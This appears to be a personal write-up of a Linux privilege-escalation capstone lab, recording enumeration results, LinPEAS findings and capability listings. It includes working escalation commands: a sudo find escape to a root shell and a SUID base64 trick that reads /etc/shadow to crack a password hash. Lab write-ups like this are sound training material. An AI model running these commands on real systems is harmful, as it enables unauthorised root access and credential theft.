# Privilege Escalation Capstone Challenge

Enumeration:

hostname = ip-10-10-15-182
kernel = 3.10.0-1160.el7.x86_64
scripting/compilers = python 2.7.5, gcc 4.8.5, perl 5.16.3
PATH locations = /home/leonard/scripts, /tmp/leonard, /home/leonard/perl5/bin
users = leonard, missy

Automated Enumeration:

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Linpeas found `/usr/bin/base64` had SUID set, vulnerability to CVE-2021-4034 and various 
other kernel exploits

Kernel Exploits

`searchsploit '3.10' 'linux kernel'`

Sudo

`sudo -l`

leonard = no sudo access
missy = `/usr/bin/find`

Used `sudo find . -exec /bin/sh \; -quit` to gain root shell as missy

SUID

`find / -type f -perm 04000 -ls 2>/dev/null`

Found no SUID or SGID set with find

Linpeas found `/usr/bin/base64`

Used `LFILE=/etc/shadow; base64 "$LFILE" | base64 -d` to grab missy's password hash and crack it

Capabilities

`getcap -r / 2>/dev/null`

/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep

Cron Jobs

No jobs in crontab

PATH

Shows /home/leonard/scripts (non-existant) and /tmp/leonard

NFS

None found
